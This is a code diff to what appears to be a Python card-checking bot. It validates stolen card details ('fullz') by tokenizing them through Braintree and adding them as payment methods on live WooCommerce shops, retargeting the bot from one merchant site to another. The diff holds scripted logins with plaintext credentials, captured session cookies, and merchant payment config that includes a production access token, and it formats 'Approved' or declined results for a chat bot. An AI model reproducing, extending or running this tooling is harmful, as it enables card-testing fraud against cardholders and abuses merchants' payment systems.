@@ -2,7 +2,6 @@ import os
 import re
 import time
 import json
-import uuid
 import asyncio
 import base64
 import random
@@ -736,7 +735,7 @@ class StripeCharge:
                 response = "INVALID ACCOUNT ❌"
                 error_message = ""
             elif "Your card number is incorrect." in error_message:
-                response = "INCORRECT CARD NUMBER ❌"
+                response = "INCORRECT NUMBER ❌"
                 error_message = ""
             elif "Suspicious activity detected. Try again in a few minutes." in error_message:
                 response = "TRY AGAIN LATER ❌"
@@ -805,52 +804,45 @@ class BraintreeAuth:
                     expiry_valid = False
             except:
                 expiry_valid = False
-            cookies = {
-                '_ga': 'GA1.1.300212947.1757562029',
-                '_gcl_au': '1.1.1085290071.1757562029',
-                'sbjs_migrations': '1418474375998%3D1',
-                'sbjs_current_add': 'fd%3D2025-09-11%2003%3A40%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
-                'sbjs_first_add': 'fd%3D2025-09-11%2003%3A40%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
-                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'Subscribe': 'true',
-                'PHPSESSID': 'n1uopd951qfh787ohb7vjqscu3',
-                'mailchimp.cart.current_email': 'paraelme@signinid.com',
-                'mailchimp_user_email': 'paraelme%40signinid.com',
-                'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-                'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9046%7Cother%7Cread%7C0e221a88586d2ac1837df9bb2950f8b26a336464857a5263dc898271b0e3b378',
-                'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'paraelme%7C1758926250%7CCj2GVZxVaIXxHsPMRLQlWX6b6yJQzM1iI2JLLn32KEn%7Ca06650d33b1b60cf31680e259198250c9b7c6df7263c9950f9f4bda9050f4dc9',
-                'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
-                'dfehc_user': 'dd738f647a03f831d8af815a784a7a2a',
-                '_ga_D1Q49TMJ2C': 'GS2.1.s1757714880$o2$g1$t1757721145$j57$l0$h0',
-                'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F',
-            }
-
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'if-modified-since': 'Fri, 29 Aug 2025 04:27:39 GMT',
                 'priority': 'u=0, i',
+                'referer': 'https://boltlaundry.com/',
                 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Linux"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'none',
+                'sec-fetch-site': 'same-origin',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
-
-            response = await session.get('https://apluscollectibles.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
-
+            response = await session.get('https://boltlaundry.com/my-login/', headers=headers)
+            login = BraintreeAuth.gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')
+            headers.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://boltlaundry.com',
+                'referer': 'https://boltlaundry.com/loginnow/',
+            })
+            data = {
+                'ihcaction': 'login',
+                'ihc_login_nonce': login,
+                'log': 'jasonmurphy',
+                'pwd': 'Jasonmur12099@',
+            }
+            await session.post('https://boltlaundry.com/my-login/', headers=headers, data=data)
+            await session.get('https://boltlaundry.com/my-account/', headers=headers)
+            await session.get('https://boltlaundry.com/my-account/payment-methods/', headers=headers)
+            response = await session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers)
             nonce = BraintreeAuth.gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
             token_data = BraintreeAuth.extract_braintree_token(response.text)
             if token_data is not None:
                 authorization_fingerprint = token_data.get('authorizationFingerprint')
-            else:
-                return "Failed to extract authorization fingerprint"
-
-            headers = {
+            headers_api = {
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
                 'authorization': f'Bearer {authorization_fingerprint}',
@@ -867,14 +859,13 @@ class BraintreeAuth:
                 'sec-fetch-site': 'cross-site',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
-
             json_data = {
                 'clientSdkMetadata': {
                     'source': 'client',
                     'integration': 'custom',
-                    'sessionId': str(uuid.uuid4()),
+                    'sessionId': '1434c429-71ba-4695-b174-a720a6f1fcc6',
                 },
-                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
                 'variables': {
                     'input': {
                         'creditCard': {
@@ -887,15 +878,12 @@ class BraintreeAuth:
                                 'streetAddress': '3228 Blackwell Street',
                             },
                         },
-                        'options': {
-                            'validate': False,
-                        },
-                    },
+                        'options': {'validate': False}
+                    }
                 },
                 'operationName': 'TokenizeCreditCard',
             }
-
-            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_api, json=json_data)
             try:
                 token = BraintreeAuth.gets(response.text, '"token":"', '"')
                 brand = BraintreeAuth.gets(response.text, '"brandCode":"', '"')
@@ -915,36 +903,14 @@ class BraintreeAuth:
                 error_message = "Expiration date invalid "
             if error_message:
                 return error_message, country, brand, bank, prepaid
-
-            cookies = {
-                '_ga': 'GA1.1.300212947.1757562029',
-                '_gcl_au': '1.1.1085290071.1757562029',
-                'sbjs_migrations': '1418474375998%3D1',
-                'sbjs_current_add': 'fd%3D2025-09-11%2003%3A40%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
-                'sbjs_first_add': 'fd%3D2025-09-11%2003%3A40%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
-                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-                'Subscribe': 'true',
-                'PHPSESSID': 'n1uopd951qfh787ohb7vjqscu3',
-                'mailchimp.cart.current_email': 'paraelme@signinid.com',
-                'mailchimp_user_email': 'paraelme%40signinid.com',
-                'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-                'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9046%7Cother%7Cread%7C0e221a88586d2ac1837df9bb2950f8b26a336464857a5263dc898271b0e3b378',
-                'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'paraelme%7C1758926250%7CCj2GVZxVaIXxHsPMRLQlWX6b6yJQzM1iI2JLLn32KEn%7Ca06650d33b1b60cf31680e259198250c9b7c6df7263c9950f9f4bda9050f4dc9',
-                'sbjs_udata': 'vst%3D3%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
-                'dfehc_user': 'dd738f647a03f831d8af815a784a7a2a',
-                '_ga_D1Q49TMJ2C': 'GS2.1.s1757714880$o2$g1$t1757721162$j40$l0$h0',
-                'sbjs_session': 'pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
-            }
-
-            headers = {
+            headers_confirm = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://apluscollectibles.com',
+                'origin': 'https://boltlaundry.com',
                 'priority': 'u=0, i',
-                'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
+                'referer': 'https://boltlaundry.com/my-account/add-payment-method/',
                 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Linux"',
@@ -955,24 +921,17 @@ class BraintreeAuth:
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
-
-            data = {
+            data_confirm = {
                 'payment_method': 'braintree_cc',
                 'braintree_cc_nonce_key': token,
-                'braintree_cc_device_data': '{"correlation_id":"acde4616-a8f7-4f12-92ab-e78e482d"}',
+                'braintree_cc_device_data': '',
                 'braintree_cc_3ds_nonce_key': '',
-                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2kdbbwxghs8nhhq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2kdbbwxghs8nhhq"},"merchantId":"n2kdbbwxghs8nhhq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"n2kdbbwxghs8nhhq","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"A Plus Collectibles","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTc4MDc1NjYsImp0aSI6ImFjY2NmZTA3LTFlMmEtNDY5Ni1iZDNiLTJlMjBkNTc1NmFiYSIsInN1YiI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.eQnRd9-djC-sykovRIW6T5GTJNuCWl3syjUySDi3eWkOCCMQa6ylIzbANY7rgCHMC480NBOo4WfZxhizcMmnrg","paypalClientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3509894786311245549","accessToken":"access_token$production$n2kdbbwxghs8nhhq$efb9a3f38aadbbd1f9853140e03c76d7","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"A Plus Collectibles","clientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"apluscollectibles_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/63cmb3nwbnpr3f9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/63cmb3nwbnpr3f9y"},"merchantId":"63cmb3nwbnpr3f9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bolt Laundry service","clientId":"ARfb8y-TA8HEUbHMho8toQgfwE5E1QKIBZd6xsRaDVIyIBp0-Q6H2xr8VYa8FU57GUBPOZR__drnQcIe","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"boltlaundryservice_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                 'woocommerce-add-payment-method-nonce': nonce,
                 '_wp_http_referer': '/my-account/add-payment-method/',
                 'woocommerce_add_payment_method': '1',
             }
-
-            response = await session.post(
-                'https://apluscollectibles.com/my-account/add-payment-method/',
-                cookies=cookies,
-                headers=headers,
-                data=data,
-            )
+            response = await session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers_confirm, data=data_confirm, follow_redirects=True)
             return response.text, country, brand, bank, prepaid
         except Exception as e:
             return f"EXCEPTION: {str(e)}", '', '', '', ''
@@ -981,7 +940,6 @@ class BraintreeAuth:
     async def charge_resp(result):
         error_message = ""
         response = ""
-
         try:
             json_resp = json.loads(result)
             if "error" in json_resp and "message" in json_resp["error"]:
@@ -993,15 +951,9 @@ class BraintreeAuth:
         except Exception:
             try:
                 soup = BeautifulSoup(unescape(result), "html.parser")
-                ul = soup.find("ul", class_="woocommerce-error")
-                if ul:
-                    li = ul.find("li")
-                    if li:
-                        error_message = li.get_text(separator=" ", strip=True)
-                else:
-                    div = soup.find("div", class_="message-container")
-                    if div:
-                        error_message = div.get_text(separator=" ", strip=True)
+                div = soup.find("div", class_="message-container")
+                if div:
+                    error_message = div.get_text(separator=" ", strip=True)
             except Exception:
                 error_message = ""
         if "Reason: " in error_message:
@@ -1010,8 +962,6 @@ class BraintreeAuth:
         if "Payment method successfully added." in error_message:
             response = "Approved ✅"
             error_message = ""
-        else:
-            response = "Approved ✅"
         if error_message:
             return f"{error_message} ❌"
         if response:
@@ -1070,15 +1020,11 @@ class BraintreeAuth:
             response = await BraintreeAuth.charge_resp(result)
         elapsed = round(time.time() - start, 2)
         error_msg = ""
-        response = ""
         try:
-            soup = BeautifulSoup(unescape(result), "html.parser")
-            ul = soup.find("ul", class_="woocommerce-error")
-            if ul:
-                li = ul.find("li")
-                if li:
-                    error_msg = li.get_text(separator=" ", strip=True)
-            else:
+            json_resp = json.loads(result)
+            if "error" in json_resp and "message" in json_resp["error"]:
+                raw_html = unescape(json_resp["error"]["message"])
+                soup = BeautifulSoup(raw_html, "html.parser")
                 div = soup.find("div", class_="message-container")
                 if div:
                     error_msg = div.get_text(separator=" ", strip=True)
@@ -1089,11 +1035,6 @@ class BraintreeAuth:
             error_msg = after.strip()
         if "Payment method successfully added." in error_msg:
             error_msg = ""
-        if "Gateway Rejected: fraud" in error_msg:
-            response = "Gateway Rejected - Fraud ❌"
-            error_msg = ""
-        else:
-            response = "Approved ✅"
         if error_msg:
             output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
                       f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
